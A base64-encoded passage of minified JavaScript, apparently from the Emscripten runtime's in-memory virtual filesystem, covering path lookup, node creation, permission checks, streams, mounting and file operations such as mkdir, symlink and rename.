RlMuaXNGaWxlKHN0cmVhbS5ub2RlLm1vZGUpKXtwb3NpdGlvbis9c3RyZWFtLm5vZGUuc2l6ZX19aWYocG9zaXRpb248MCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX1yZXR1cm4gcG9zaXRpb259KX19O1NUQVRJQ1RPUCs9MTY7U1RBVElDVE9QKz0xNjtTVEFUSUNUT1ArPTE2O3ZhciBGUz17cm9vdDpudWxsLG1vdW50czpbXSxkZXZpY2VzOltudWxsXSxzdHJlYW1zOltdLG5leHRJbm9kZToxLG5hbWVUYWJsZTpudWxsLGN1cnJlbnRQYXRoOiIvIixpbml0aWFsaXplZDpmYWxzZSxpZ25vcmVQZXJtaXNzaW9uczp0cnVlLHRyYWNraW5nRGVsZWdhdGU6e30sdHJhY2tpbmc6e29wZW5GbGFnczp7UkVBRDoxLFdSSVRFOjJ9fSxFcnJub0Vycm9yOm51bGwsZ2VuZXJpY0Vycm9yczp7fSxmaWxlc3lzdGVtczpudWxsLHN5bmNGU1JlcXVlc3RzOjAsaGFuZGxlRlNFcnJvcjooZnVuY3Rpb24oZSl7aWYoIShlIGluc3RhbmNlb2YgRlMuRXJybm9FcnJvcikpdGhyb3cgZSsiIDogIitzdGFja1RyYWNlKCk7cmV0dXJuIF9fX3NldEVyck5vKGUuZXJybm8pfSksbG9va3VwUGF0aDooZnVuY3Rpb24ocGF0aCxvcHRzKXtwYXRoPVBBVEgucmVzb2x2ZShGUy5jd2QoKSxwYXRoKTtvcHRzPW9wdHN8fHt9O2lmKCFwYXRoKXJldHVybntwYXRoOiIiLG5vZGU6bnVsbH07dmFyIGRlZmF1bHRzPXtmb2xsb3dfbW91bnQ6dHJ1ZSxyZWN1cnNlX2NvdW50OjB9O2Zvcih2YXIga2V5IGluIGRlZmF1bHRzKXtpZihvcHRzW2tleV09PT11bmRlZmluZWQpe29wdHNba2V5XT1kZWZhdWx0c1trZXldfX1pZihvcHRzLnJlY3Vyc2VfY291bnQ+OCl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUxPT1ApfXZhciBwYXJ0cz1QQVRILm5vcm1hbGl6ZUFycmF5KHBhdGguc3BsaXQoIi8iKS5maWx0ZXIoKGZ1bmN0aW9uKHApe3JldHVybiEhcH0pKSxmYWxzZSk7dmFyIGN1cnJlbnQ9RlMucm9vdDt2YXIgY3VycmVudF9wYXRoPSIvIjtmb3IodmFyIGk9MDtpPHBhcnRzLmxlbmd0aDtpKyspe3ZhciBpc2xhc3Q9aT09PXBhcnRzLmxlbmd0aC0xO2lmKGlzbGFzdCYmb3B0cy5wYXJlbnQpe2JyZWFrfWN1cnJlbnQ9RlMubG9va3VwTm9kZShjdXJyZW50LHBhcnRzW2ldKTtjdXJyZW50X3BhdGg9UEFUSC5qb2luMihjdXJyZW50X3BhdGgscGFydHNbaV0pO2lmKEZTLmlzTW91bnRwb2ludChjdXJyZW50KSl7aWYoIWlzbGFzdHx8aXNsYXN0JiZvcHRzLmZvbGxvd19tb3VudCl7Y3VycmVudD1jdXJyZW50Lm1vdW50ZWQucm9vdH19aWYoIWlzbGFzdHx8b3B0cy5mb2xsb3cpe3ZhciBjb3VudD0wO3doaWxlKEZTLmlzTGluayhjdXJyZW50Lm1vZGUpKXt2YXIgbGluaz1GUy5yZWFkbGluayhjdXJyZW50X3BhdGgpO2N1cnJlbnRfcGF0aD1QQVRILnJlc29sdmUoUEFUSC5kaXJuYW1lKGN1cnJlbnRfcGF0aCksbGluayk7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKGN1cnJlbnRfcGF0aCx7cmVjdXJzZV9jb3VudDpvcHRzLnJlY3Vyc2VfY291bnR9KTtjdXJyZW50PWxvb2t1cC5ub2RlO2lmKGNvdW50Kys+NDApe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVMT09QKX19fX1yZXR1cm57cGF0aDpjdXJyZW50X3BhdGgsbm9kZTpjdXJyZW50fX0pLGdldFBhdGg6KGZ1bmN0aW9uKG5vZGUpe3ZhciBwYXRoO3doaWxlKHRydWUpe2lmKEZTLmlzUm9vdChub2RlKSl7dmFyIG1vdW50PW5vZGUubW91bnQubW91bnRwb2ludDtpZighcGF0aClyZXR1cm4gbW91bnQ7cmV0dXJuIG1vdW50W21vdW50Lmxlbmd0aC0xXSE9PSIvIj9tb3VudCsiLyIrcGF0aDptb3VudCtwYXRofXBhdGg9cGF0aD9ub2RlLm5hbWUrIi8iK3BhdGg6bm9kZS5uYW1lO25vZGU9bm9kZS5wYXJlbnR9fSksaGFzaE5hbWU6KGZ1bmN0aW9uKHBhcmVudGlkLG5hbWUpe3ZhciBoYXNoPTA7Zm9yKHZhciBpPTA7aTxuYW1lLmxlbmd0aDtpKyspe2hhc2g9KGhhc2g8PDUpLWhhc2grbmFtZS5jaGFyQ29kZUF0KGkpfDB9cmV0dXJuKHBhcmVudGlkK2hhc2g+Pj4wKSVGUy5uYW1lVGFibGUubGVuZ3RofSksaGFzaEFkZE5vZGU6KGZ1bmN0aW9uKG5vZGUpe3ZhciBoYXNoPUZTLmhhc2hOYW1lKG5vZGUucGFyZW50LmlkLG5vZGUubmFtZSk7bm9kZS5uYW1lX25leHQ9RlMubmFtZVRhYmxlW2hhc2hdO0ZTLm5hbWVUYWJsZVtoYXNoXT1ub2RlfSksaGFzaFJlbW92ZU5vZGU6KGZ1bmN0aW9uKG5vZGUpe3ZhciBoYXNoPUZTLmhhc2hOYW1lKG5vZGUucGFyZW50LmlkLG5vZGUubmFtZSk7aWYoRlMubmFtZVRhYmxlW2hhc2hdPT09bm9kZSl7RlMubmFtZVRhYmxlW2hhc2hdPW5vZGUubmFtZV9uZXh0fWVsc2V7dmFyIGN1cnJlbnQ9RlMubmFtZVRhYmxlW2hhc2hdO3doaWxlKGN1cnJlbnQpe2lmKGN1cnJlbnQubmFtZV9uZXh0PT09bm9kZSl7Y3VycmVudC5uYW1lX25leHQ9bm9kZS5uYW1lX25leHQ7YnJlYWt9Y3VycmVudD1jdXJyZW50Lm5hbWVfbmV4dH19fSksbG9va3VwTm9kZTooZnVuY3Rpb24ocGFyZW50LG5hbWUpe3ZhciBlcnI9RlMubWF5TG9va3VwKHBhcmVudCk7aWYoZXJyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnIscGFyZW50KX12YXIgaGFzaD1GUy5oYXNoTmFtZShwYXJlbnQuaWQsbmFtZSk7Zm9yKHZhciBub2RlPUZTLm5hbWVUYWJsZVtoYXNoXTtub2RlO25vZGU9bm9kZS5uYW1lX25leHQpe3ZhciBub2RlTmFtZT1ub2RlLm5hbWU7aWYobm9kZS5wYXJlbnQuaWQ9PT1wYXJlbnQuaWQmJm5vZGVOYW1lPT09bmFtZSl7cmV0dXJuIG5vZGV9fXJldHVybiBGUy5sb29rdXAocGFyZW50LG5hbWUpfSksY3JlYXRlTm9kZTooZnVuY3Rpb24ocGFyZW50LG5hbWUsbW9kZSxyZGV2KXtpZighRlMuRlNOb2RlKXtGUy5GU05vZGU9KGZ1bmN0aW9uKHBhcmVudCxuYW1lLG1vZGUscmRldil7aWYoIXBhcmVudCl7cGFyZW50PXRoaXN9dGhpcy5wYXJlbnQ9cGFyZW50O3RoaXMubW91bnQ9cGFyZW50Lm1vdW50O3RoaXMubW91bnRlZD1udWxsO3RoaXMuaWQ9RlMubmV4dElub2RlKys7dGhpcy5uYW1lPW5hbWU7dGhpcy5tb2RlPW1vZGU7dGhpcy5ub2RlX29wcz17fTt0aGlzLnN0cmVhbV9vcHM9e307dGhpcy5yZGV2PXJkZXZ9KTtGUy5GU05vZGUucHJvdG90eXBlPXt9O3ZhciByZWFkTW9kZT0yOTJ8NzM7dmFyIHdyaXRlTW9kZT0xNDY7T2JqZWN0LmRlZmluZVByb3BlcnRpZXMoRlMuRlNOb2RlLnByb3RvdHlwZSx7cmVhZDp7Z2V0OihmdW5jdGlvbigpe3JldHVybih0aGlzLm1vZGUmcmVhZE1vZGUpPT09cmVhZE1vZGV9KSxzZXQ6KGZ1bmN0aW9uKHZhbCl7dmFsP3RoaXMubW9kZXw9cmVhZE1vZGU6dGhpcy5tb2RlJj1+cmVhZE1vZGV9KX0sd3JpdGU6e2dldDooZnVuY3Rpb24oKXtyZXR1cm4odGhpcy5tb2RlJndyaXRlTW9kZSk9PT13cml0ZU1vZGV9KSxzZXQ6KGZ1bmN0aW9uKHZhbCl7dmFsP3RoaXMubW9kZXw9d3JpdGVNb2RlOnRoaXMubW9kZSY9fndyaXRlTW9kZX0pfSxpc0ZvbGRlcjp7Z2V0OihmdW5jdGlvbigpe3JldHVybiBGUy5pc0Rpcih0aGlzLm1vZGUpfSl9LGlzRGV2aWNlOntnZXQ6KGZ1bmN0aW9uKCl7cmV0dXJuIEZTLmlzQ2hyZGV2KHRoaXMubW9kZSl9KX19KX12YXIgbm9kZT1uZXcgRlMuRlNOb2RlKHBhcmVudCxuYW1lLG1vZGUscmRldik7RlMuaGFzaEFkZE5vZGUobm9kZSk7cmV0dXJuIG5vZGV9KSxkZXN0cm95Tm9kZTooZnVuY3Rpb24obm9kZSl7RlMuaGFzaFJlbW92ZU5vZGUobm9kZSl9KSxpc1Jvb3Q6KGZ1bmN0aW9uKG5vZGUpe3JldHVybiBub2RlPT09bm9kZS5wYXJlbnR9KSxpc01vdW50cG9pbnQ6KGZ1bmN0aW9uKG5vZGUpe3JldHVybiEhbm9kZS5tb3VudGVkfSksaXNGaWxlOihmdW5jdGlvbihtb2RlKXtyZXR1cm4obW9kZSY2MTQ0MCk9PT0zMjc2OH0pLGlzRGlyOihmdW5jdGlvbihtb2RlKXtyZXR1cm4obW9kZSY2MTQ0MCk9PT0xNjM4NH0pLGlzTGluazooZnVuY3Rpb24obW9kZSl7cmV0dXJuKG1vZGUmNjE0NDApPT09NDA5NjB9KSxpc0NocmRldjooZnVuY3Rpb24obW9kZSl7cmV0dXJuKG1vZGUmNjE0NDApPT09ODE5Mn0pLGlzQmxrZGV2OihmdW5jdGlvbihtb2RlKXtyZXR1cm4obW9kZSY2MTQ0MCk9PT0yNDU3Nn0pLGlzRklGTzooZnVuY3Rpb24obW9kZSl7cmV0dXJuKG1vZGUmNjE0NDApPT09NDA5Nn0pLGlzU29ja2V0OihmdW5jdGlvbihtb2RlKXtyZXR1cm4obW9kZSY0OTE1Mik9PT00OTE1Mn0pLGZsYWdNb2Rlczp7InIiOjAsInJzIjoxMDUyNjcyLCJyKyI6MiwidyI6NTc3LCJ3eCI6NzA1LCJ4dyI6NzA1LCJ3KyI6NTc4LCJ3eCsiOjcwNiwieHcrIjo3MDYsImEiOjEwODksImF4IjoxMjE3LCJ4YSI6MTIxNywiYSsiOjEwOTAsImF4KyI6MTIxOCwieGErIjoxMjE4fSxtb2RlU3RyaW5nVG9GbGFnczooZnVuY3Rpb24oc3RyKXt2YXIgZmxhZ3M9RlMuZmxhZ01vZGVzW3N0cl07aWYodHlwZW9mIGZsYWdzPT09InVuZGVmaW5lZCIpe3Rocm93IG5ldyBFcnJvcigiVW5rbm93biBmaWxlIG9wZW4gbW9kZTogIitzdHIpfXJldHVybiBmbGFnc30pLGZsYWdzVG9QZXJtaXNzaW9uU3RyaW5nOihmdW5jdGlvbihmbGFnKXt2YXIgcGVybXM9WyJyIiwidyIsInJ3Il1bZmxhZyYzXTtpZihmbGFnJjUxMil7cGVybXMrPSJ3In1yZXR1cm4gcGVybXN9KSxub2RlUGVybWlzc2lvbnM6KGZ1bmN0aW9uKG5vZGUscGVybXMpe2lmKEZTLmlnbm9yZVBlcm1pc3Npb25zKXtyZXR1cm4gMH1pZihwZXJtcy5pbmRleE9mKCJyIikhPT0tMSYmIShub2RlLm1vZGUmMjkyKSl7cmV0dXJuIEVSUk5PX0NPREVTLkVBQ0NFU31lbHNlIGlmKHBlcm1zLmluZGV4T2YoInciKSE9PS0xJiYhKG5vZGUubW9kZSYxNDYpKXtyZXR1cm4gRVJSTk9fQ09ERVMuRUFDQ0VTfWVsc2UgaWYocGVybXMuaW5kZXhPZigieCIpIT09LTEmJiEobm9kZS5tb2RlJjczKSl7cmV0dXJuIEVSUk5PX0NPREVTLkVBQ0NFU31yZXR1cm4gMH0pLG1heUxvb2t1cDooZnVuY3Rpb24oZGlyKXt2YXIgZXJyPUZTLm5vZGVQZXJtaXNzaW9ucyhkaXIsIngiKTtpZihlcnIpcmV0dXJuIGVycjtpZighZGlyLm5vZGVfb3BzLmxvb2t1cClyZXR1cm4gRVJSTk9fQ09ERVMuRUFDQ0VTO3JldHVybiAwfSksbWF5Q3JlYXRlOihmdW5jdGlvbihkaXIsbmFtZSl7dHJ5e3ZhciBub2RlPUZTLmxvb2t1cE5vZGUoZGlyLG5hbWUpO3JldHVybiBFUlJOT19DT0RFUy5FRVhJU1R9Y2F0Y2goZSl7fXJldHVybiBGUy5ub2RlUGVybWlzc2lvbnMoZGlyLCJ3eCIpfSksbWF5RGVsZXRlOihmdW5jdGlvbihkaXIsbmFtZSxpc2Rpcil7dmFyIG5vZGU7dHJ5e25vZGU9RlMubG9va3VwTm9kZShkaXIsbmFtZSl9Y2F0Y2goZSl7cmV0dXJuIGUuZXJybm99dmFyIGVycj1GUy5ub2RlUGVybWlzc2lvbnMoZGlyLCJ3eCIpO2lmKGVycil7cmV0dXJuIGVycn1pZihpc2Rpcil7aWYoIUZTLmlzRGlyKG5vZGUubW9kZSkpe3JldHVybiBFUlJOT19DT0RFUy5FTk9URElSfWlmKEZTLmlzUm9vdChub2RlKXx8RlMuZ2V0UGF0aChub2RlKT09PUZTLmN3ZCgpKXtyZXR1cm4gRVJSTk9fQ09ERVMuRUJVU1l9fWVsc2V7aWYoRlMuaXNEaXIobm9kZS5tb2RlKSl7cmV0dXJuIEVSUk5PX0NPREVTLkVJU0RJUn19cmV0dXJuIDB9KSxtYXlPcGVuOihmdW5jdGlvbihub2RlLGZsYWdzKXtpZighbm9kZSl7cmV0dXJuIEVSUk5PX0NPREVTLkVOT0VOVH1pZihGUy5pc0xpbmsobm9kZS5tb2RlKSl7cmV0dXJuIEVSUk5PX0NPREVTLkVMT09QfWVsc2UgaWYoRlMuaXNEaXIobm9kZS5tb2RlKSl7aWYoRlMuZmxhZ3NUb1Blcm1pc3Npb25TdHJpbmcoZmxhZ3MpIT09InIifHxmbGFncyY1MTIpe3JldHVybiBFUlJOT19DT0RFUy5FSVNESVJ9fXJldHVybiBGUy5ub2RlUGVybWlzc2lvbnMobm9kZSxGUy5mbGFnc1RvUGVybWlzc2lvblN0cmluZyhmbGFncykpfSksTUFYX09QRU5fRkRTOjQwOTYsbmV4dGZkOihmdW5jdGlvbihmZF9zdGFydCxmZF9lbmQpe2ZkX3N0YXJ0PWZkX3N0YXJ0fHwwO2ZkX2VuZD1mZF9lbmR8fEZTLk1BWF9PUEVOX0ZEUztmb3IodmFyIGZkPWZkX3N0YXJ0O2ZkPD1mZF9lbmQ7ZmQrKyl7aWYoIUZTLnN0cmVhbXNbZmRdKXtyZXR1cm4gZmR9fXRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVNRklMRSl9KSxnZXRTdHJlYW06KGZ1bmN0aW9uKGZkKXtyZXR1cm4gRlMuc3RyZWFtc1tmZF19KSxjcmVhdGVTdHJlYW06KGZ1bmN0aW9uKHN0cmVhbSxmZF9zdGFydCxmZF9lbmQpe2lmKCFGUy5GU1N0cmVhbSl7RlMuRlNTdHJlYW09KGZ1bmN0aW9uKCl7fSk7RlMuRlNTdHJlYW0ucHJvdG90eXBlPXt9O09iamVjdC5kZWZpbmVQcm9wZXJ0aWVzKEZTLkZTU3RyZWFtLnByb3RvdHlwZSx7b2JqZWN0OntnZXQ6KGZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMubm9kZX0pLHNldDooZnVuY3Rpb24odmFsKXt0aGlzLm5vZGU9dmFsfSl9LGlzUmVhZDp7Z2V0OihmdW5jdGlvbigpe3JldHVybih0aGlzLmZsYWdzJjIwOTcxNTUpIT09MX0pfSxpc1dyaXRlOntnZXQ6KGZ1bmN0aW9uKCl7cmV0dXJuKHRoaXMuZmxhZ3MmMjA5NzE1NSkhPT0wfSl9LGlzQXBwZW5kOntnZXQ6KGZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuZmxhZ3MmMTAyNH0pfX0pfXZhciBuZXdTdHJlYW09bmV3IEZTLkZTU3RyZWFtO2Zvcih2YXIgcCBpbiBzdHJlYW0pe25ld1N0cmVhbVtwXT1zdHJlYW1bcF19c3RyZWFtPW5ld1N0cmVhbTt2YXIgZmQ9RlMubmV4dGZkKGZkX3N0YXJ0LGZkX2VuZCk7c3RyZWFtLmZkPWZkO0ZTLnN0cmVhbXNbZmRdPXN0cmVhbTtyZXR1cm4gc3RyZWFtfSksY2xvc2VTdHJlYW06KGZ1bmN0aW9uKGZkKXtGUy5zdHJlYW1zW2ZkXT1udWxsfSksY2hyZGV2X3N0cmVhbV9vcHM6e29wZW46KGZ1bmN0aW9uKHN0cmVhbSl7dmFyIGRldmljZT1GUy5nZXREZXZpY2Uoc3RyZWFtLm5vZGUucmRldik7c3RyZWFtLnN0cmVhbV9vcHM9ZGV2aWNlLnN0cmVhbV9vcHM7aWYoc3RyZWFtLnN0cmVhbV9vcHMub3Blbil7c3RyZWFtLnN0cmVhbV9vcHMub3BlbihzdHJlYW0pfX0pLGxsc2VlazooZnVuY3Rpb24oKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FU1BJUEUpfSl9LG1ham9yOihmdW5jdGlvbihkZXYpe3JldHVybiBkZXY+Pjh9KSxtaW5vcjooZnVuY3Rpb24oZGV2KXtyZXR1cm4gZGV2JjI1NX0pLG1ha2VkZXY6KGZ1bmN0aW9uKG1hLG1pKXtyZXR1cm4gbWE8PDh8bWl9KSxyZWdpc3RlckRldmljZTooZnVuY3Rpb24oZGV2LG9wcyl7RlMuZGV2aWNlc1tkZXZdPXtzdHJlYW1fb3BzOm9wc319KSxnZXREZXZpY2U6KGZ1bmN0aW9uKGRldil7cmV0dXJuIEZTLmRldmljZXNbZGV2XX0pLGdldE1vdW50czooZnVuY3Rpb24obW91bnQpe3ZhciBtb3VudHM9W107dmFyIGNoZWNrPVttb3VudF07d2hpbGUoY2hlY2subGVuZ3RoKXt2YXIgbT1jaGVjay5wb3AoKTttb3VudHMucHVzaChtKTtjaGVjay5wdXNoLmFwcGx5KGNoZWNrLG0ubW91bnRzKX1yZXR1cm4gbW91bnRzfSksc3luY2ZzOihmdW5jdGlvbihwb3B1bGF0ZSxjYWxsYmFjayl7aWYodHlwZW9mIHBvcHVsYXRlPT09ImZ1bmN0aW9uIil7Y2FsbGJhY2s9cG9wdWxhdGU7cG9wdWxhdGU9ZmFsc2V9RlMuc3luY0ZTUmVxdWVzdHMrKztpZihGUy5zeW5jRlNSZXF1ZXN0cz4xKXtjb25zb2xlLmxvZygid2FybmluZzogIitGUy5zeW5jRlNSZXF1ZXN0cysiIEZTLnN5bmNmcyBvcGVyYXRpb25zIGluIGZsaWdodCBhdCBvbmNlLCBwcm9iYWJseSBqdXN0IGRvaW5nIGV4dHJhIHdvcmsiKX12YXIgbW91bnRzPUZTLmdldE1vdW50cyhGUy5yb290Lm1vdW50KTt2YXIgY29tcGxldGVkPTA7ZnVuY3Rpb24gZG9DYWxsYmFjayhlcnIpe2Fzc2VydChGUy5zeW5jRlNSZXF1ZXN0cz4wKTtGUy5zeW5jRlNSZXF1ZXN0cy0tO3JldHVybiBjYWxsYmFjayhlcnIpfWZ1bmN0aW9uIGRvbmUoZXJyKXtpZihlcnIpe2lmKCFkb25lLmVycm9yZWQpe2RvbmUuZXJyb3JlZD10cnVlO3JldHVybiBkb0NhbGxiYWNrKGVycil9cmV0dXJufWlmKCsrY29tcGxldGVkPj1tb3VudHMubGVuZ3RoKXtkb0NhbGxiYWNrKG51bGwpfX1tb3VudHMuZm9yRWFjaCgoZnVuY3Rpb24obW91bnQpe2lmKCFtb3VudC50eXBlLnN5bmNmcyl7cmV0dXJuIGRvbmUobnVsbCl9bW91bnQudHlwZS5zeW5jZnMobW91bnQscG9wdWxhdGUsZG9uZSl9KSl9KSxtb3VudDooZnVuY3Rpb24odHlwZSxvcHRzLG1vdW50cG9pbnQpe3ZhciByb290PW1vdW50cG9pbnQ9PT0iLyI7dmFyIHBzZXVkbz0hbW91bnRwb2ludDt2YXIgbm9kZTtpZihyb290JiZGUy5yb290KXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQlVTWSl9ZWxzZSBpZighcm9vdCYmIXBzZXVkbyl7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKG1vdW50cG9pbnQse2ZvbGxvd19tb3VudDpmYWxzZX0pO21vdW50cG9pbnQ9bG9va3VwLnBhdGg7bm9kZT1sb29rdXAubm9kZTtpZihGUy5pc01vdW50cG9pbnQobm9kZSkpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCVVNZKX1pZighRlMuaXNEaXIobm9kZS5tb2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PVERJUil9fXZhciBtb3VudD17dHlwZTp0eXBlLG9wdHM6b3B0cyxtb3VudHBvaW50Om1vdW50cG9pbnQsbW91bnRzOltdfTt2YXIgbW91bnRSb290PXR5cGUubW91bnQobW91bnQpO21vdW50Um9vdC5tb3VudD1tb3VudDttb3VudC5yb290PW1vdW50Um9vdDtpZihyb290KXtGUy5yb290PW1vdW50Um9vdH1lbHNlIGlmKG5vZGUpe25vZGUubW91bnRlZD1tb3VudDtpZihub2RlLm1vdW50KXtub2RlLm1vdW50Lm1vdW50cy5wdXNoKG1vdW50KX19cmV0dXJuIG1vdW50Um9vdH0pLHVubW91bnQ6KGZ1bmN0aW9uKG1vdW50cG9pbnQpe3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChtb3VudHBvaW50LHtmb2xsb3dfbW91bnQ6ZmFsc2V9KTtpZighRlMuaXNNb3VudHBvaW50KGxvb2t1cC5ub2RlKSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX12YXIgbm9kZT1sb29rdXAubm9kZTt2YXIgbW91bnQ9bm9kZS5tb3VudGVkO3ZhciBtb3VudHM9RlMuZ2V0TW91bnRzKG1vdW50KTtPYmplY3Qua2V5cyhGUy5uYW1lVGFibGUpLmZvckVhY2goKGZ1bmN0aW9uKGhhc2gpe3ZhciBjdXJyZW50PUZTLm5hbWVUYWJsZVtoYXNoXTt3aGlsZShjdXJyZW50KXt2YXIgbmV4dD1jdXJyZW50Lm5hbWVfbmV4dDtpZihtb3VudHMuaW5kZXhPZihjdXJyZW50Lm1vdW50KSE9PS0xKXtGUy5kZXN0cm95Tm9kZShjdXJyZW50KX1jdXJyZW50PW5leHR9fSkpO25vZGUubW91bnRlZD1udWxsO3ZhciBpZHg9bm9kZS5tb3VudC5tb3VudHMuaW5kZXhPZihtb3VudCk7YXNzZXJ0KGlkeCE9PS0xKTtub2RlLm1vdW50Lm1vdW50cy5zcGxpY2UoaWR4LDEpfSksbG9va3VwOihmdW5jdGlvbihwYXJlbnQsbmFtZSl7cmV0dXJuIHBhcmVudC5ub2RlX29wcy5sb29rdXAocGFyZW50LG5hbWUpfSksbWtub2Q6KGZ1bmN0aW9uKHBhdGgsbW9kZSxkZXYpe3ZhciBsb29rdXA9RlMubG9va3VwUGF0aChwYXRoLHtwYXJlbnQ6dHJ1ZX0pO3ZhciBwYXJlbnQ9bG9va3VwLm5vZGU7dmFyIG5hbWU9UEFUSC5iYXNlbmFtZShwYXRoKTtpZighbmFtZXx8bmFtZT09PSIuInx8bmFtZT09PSIuLiIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCl9dmFyIGVycj1GUy5tYXlDcmVhdGUocGFyZW50LG5hbWUpO2lmKGVycil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoZXJyKX1pZighcGFyZW50Lm5vZGVfb3BzLm1rbm9kKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSl9cmV0dXJuIHBhcmVudC5ub2RlX29wcy5ta25vZChwYXJlbnQsbmFtZSxtb2RlLGRldil9KSxjcmVhdGU6KGZ1bmN0aW9uKHBhdGgsbW9kZSl7bW9kZT1tb2RlIT09dW5kZWZpbmVkP21vZGU6NDM4O21vZGUmPTQwOTU7bW9kZXw9MzI3Njg7cmV0dXJuIEZTLm1rbm9kKHBhdGgsbW9kZSwwKX0pLG1rZGlyOihmdW5jdGlvbihwYXRoLG1vZGUpe21vZGU9bW9kZSE9PXVuZGVmaW5lZD9tb2RlOjUxMTttb2RlJj01MTF8NTEyO21vZGV8PTE2Mzg0O3JldHVybiBGUy5ta25vZChwYXRoLG1vZGUsMCl9KSxta2RpclRyZWU6KGZ1bmN0aW9uKHBhdGgsbW9kZSl7dmFyIGRpcnM9cGF0aC5zcGxpdCgiLyIpO3ZhciBkPSIiO2Zvcih2YXIgaT0wO2k8ZGlycy5sZW5ndGg7KytpKXtpZighZGlyc1tpXSljb250aW51ZTtkKz0iLyIrZGlyc1tpXTt0cnl7RlMubWtkaXIoZCxtb2RlKX1jYXRjaChlKXtpZihlLmVycm5vIT1FUlJOT19DT0RFUy5FRVhJU1QpdGhyb3cgZX19fSksbWtkZXY6KGZ1bmN0aW9uKHBhdGgsbW9kZSxkZXYpe2lmKHR5cGVvZiBkZXY9PT0idW5kZWZpbmVkIil7ZGV2PW1vZGU7bW9kZT00Mzh9bW9kZXw9ODE5MjtyZXR1cm4gRlMubWtub2QocGF0aCxtb2RlLGRldil9KSxzeW1saW5rOihmdW5jdGlvbihvbGRwYXRoLG5ld3BhdGgpe2lmKCFQQVRILnJlc29sdmUob2xkcGF0aCkpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT0VOVCl9dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKG5ld3BhdGgse3BhcmVudDp0cnVlfSk7dmFyIHBhcmVudD1sb29rdXAubm9kZTtpZighcGFyZW50KXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9FTlQpfXZhciBuZXduYW1lPVBBVEguYmFzZW5hbWUobmV3cGF0aCk7dmFyIGVycj1GUy5tYXlDcmVhdGUocGFyZW50LG5ld25hbWUpO2lmKGVycil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoZXJyKX1pZighcGFyZW50Lm5vZGVfb3BzLnN5bWxpbmspe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVQRVJNKX1yZXR1cm4gcGFyZW50Lm5vZGVfb3BzLnN5bWxpbmsocGFyZW50LG5ld25hbWUsb2xkcGF0aCl9KSxyZW5hbWU6KGZ1bmN0aW9uKG9sZF9wYXRoLG5ld19wYXRoKXt2YXIgb2xkX2Rpcm5hbWU9UEFUSC5kaXJuYW1lKG9sZF9wYXRoKTt2YXIgbmV3X2Rpcm5hbWU9UEFUSC5kaXJuYW1lKG5ld19wYXRoKTt2YXIgb2xkX25hbWU9UEFUSC5iYXNlbmFtZShvbGRfcGF0aCk7dmFyIG5ld19uYW1lPVBBVEguYmFzZW5hbWUobmV3X3BhdGgpO3ZhciBsb29rdXAsb2xkX2RpcixuZXdfZGlyO3RyeXtsb29rdXA9RlMubG9va3VwUGF0aChvbGRfcGF0aCx7cGFyZW50OnRydWV9KTtvbGRfZGlyPWxvb2t1cC5ub2RlO2xvb2t1cD1GUy5sb29rdXBQYXRoKG5ld19wYXRoLHtwYXJlbnQ6dHJ1ZX0pO25ld19kaXI9bG9va3VwLm5vZGV9Y2F0Y2goZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJVU1kpfWlmKCFvbGRfZGlyfHwhbmV3X2Rpcil0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9FTlQpO2lmKG9sZF9kaXIubW91bnQhPT1uZXdfZGlyLm1vdW50KXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FWERFVil9dmFyIG9sZF9ub2RlPUZTLmxvb2t1cE5vZGUob2xkX2RpcixvbGRfbmFtZSk7dmFyIHJlbGF0aXZlPVBBVEgucmVsYXRpdmUob2xkX3BhdGgsbmV3X2Rpcm5hbWUpO2lmKHJlbGF0aXZlLmNoYXJBdCgwKSE9PSIuIil7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKX1yZWxhdGl2ZT1QQVRILnJlbGF0aXZlKG5ld19wYXRoLG9sZF9kaXJuYW1lKTtpZihyZWxhdGl2ZS5jaGFyQXQoMCkhPT0iLiIpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT1RFTVBUWSl9dmFyIG5ld19ub2RlO3RyeXtuZXdfbm9kZT1GUy5sb29rdXBOb2RlKG5ld19kaXIsbmV3X25hbWUpfWNhdGNoKGUpe31pZihvbGRfbm9kZT09PW5ld19ub2RlKXtyZXR1cm59dmFyIGlzZGlyPUZTLmlzRGlyKG9sZF9ub2RlLm1vZGUpO3ZhciBlcnI9RlMubWF5RGVsZXRlKG9sZF9kaXIsb2xkX25hbWUsaXNkaXIpO2lmKGVycil7dGhyb3cgbmV3IEZTLkVycm5vRXJy